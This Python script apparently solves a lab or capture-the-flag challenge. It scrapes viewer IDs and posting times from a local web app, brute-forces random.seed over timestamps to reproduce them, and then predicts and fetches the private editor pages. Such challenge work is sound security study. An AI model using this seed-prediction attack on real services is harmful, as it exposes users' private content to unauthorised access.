#!/usr/bin/env python3

import calendar
import random
import requests
import string
import time


# Hack but I did not want to copypaste `get_random_id` method
import os, sys, inspect
currentdir = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
parentdir = os.path.dirname(currentdir)
sys.path.insert(0, parentdir + '/docker/app')

from app import get_random_id


# 32 letters + int(timestamp) -> 2 sec to cover whole day
# 64 letters + int(timestamp) -> 3.5 sec to cover whole day
# 32 letters + int(timestamp) + shuffle inside -> 39 sec to cover whole day
# 64 letters + int(timestamp) + shuffle inside -> 82 sec to cover whole day
# 8 letters + round(timestamp, 3) -> 16 minutes to cover whole day
# 32 letters + round(timestamp, 3) -> 17 minutes to cover till 10:00 => 40 minutes for whole day

BASE_URL = 'http://localhost:5002'

entries = []

r = requests.get(BASE_URL)
for line in r.text.split('\n'):
    if 'href' in line:
        href = line.split('"')[1]
        if not href.startswith('/view/'):
            continue
        id_viewer = href.split('/')[2]
        r2 = requests.get('{}/view/{}'.format(BASE_URL, id_viewer))
        line_posted_at = r2.text.split('\n')[-4].split()
        posted_at = ' '.join(line_posted_at[3:4+1])
        entries.append((posted_at, id_viewer))


for entry in entries:
    timestamp_0 = calendar.timegm(time.strptime(entry[0] + ':00', '%Y-%m-%d %H:%M:%S'))

    timestamp = timestamp_0
    while timestamp < timestamp_0 + 60:
        random.seed(timestamp)
        id_viewer_candidate = get_random_id()
        if id_viewer_candidate == entry[1]:
            id_editor = get_random_id()
            print(timestamp, id_viewer_candidate, id_editor)
            url = '{}/view/{}'.format(BASE_URL, id_editor)
            r = requests.get(url)
            print(r.text.split('\n')[-12])
            print()
            break

        timestamp = round(timestamp + 0.0001, 4)
